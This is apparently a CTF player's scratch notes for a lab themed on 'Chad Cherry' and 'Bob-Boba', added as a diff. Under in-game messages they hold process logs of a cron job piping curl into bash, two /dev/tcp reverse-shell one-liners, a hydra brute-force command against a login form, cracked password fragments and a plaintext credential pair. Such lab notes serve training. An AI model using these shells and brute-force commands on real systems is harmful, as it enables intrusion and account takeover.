@@ -1,0 +1,60 @@
+Hey good work hacker. Glad you made it this far!
+
+From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to escalate your privileges vertically to access his account?
+
+Keep your's eyes peeled and don't be a script kiddie!
+
+- Jex
+
+
+2024/07/22 10:34:01 CMD: UID=0     PID=35404  | /usr/sbin/CRON -f -P 
+2024/07/22 10:34:01 CMD: UID=0     PID=35405  | /usr/sbin/CRON -f -P 
+2024/07/22 10:34:01 CMD: UID=1003  PID=35408  | /bin/sh -c curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash 
+2024/07/22 10:34:01 CMD: UID=1003  PID=35407  | /bin/sh -c curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash 
+
+
+/bin/bash -l > /dev/tcp/10.11.98.225/4444 0<&1 2>&1
+
+
+bash -i >& /dev/tcp/10.11.98.225/3333 0>&1
+
+
+
+4/10/20XX
+
+One of the funniest parts of working for Chad is both how much debt we have and how much other people owe us!
+
+I know that Chad uses me as both his accountant and debt collector, but really, we need to hire more henchmen.
+
+Perhaps we can convince the Arch Linux users to join our cause... Hopefully none of them like Vim, after all, Chad intends to eliminate every trace of the text editor and replace it with Nano.
+
+Either way, I gotta really protect this password segment Chad gave me in case of emergencies!
+
+Bob
+
+
+
+
+7h3fu7ur3
+
+
+puppet
+
+
+hydra -l puppet -P /usr/share/wordlists/rockyou.txt nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=This user doesn't exist:Bad password" -f -V
+
+	
+
+
+ChadCherrysFutureWife 
+
+ n4n0ch3rry(1)     w1llb3  
+7h3fu7ur3(3)
+
+
+n4n0ch3rryw1llb37h3fu7ur3
+
+IDOR bruteforce
+
+
+sam-sprinkles:SammyInMiami43
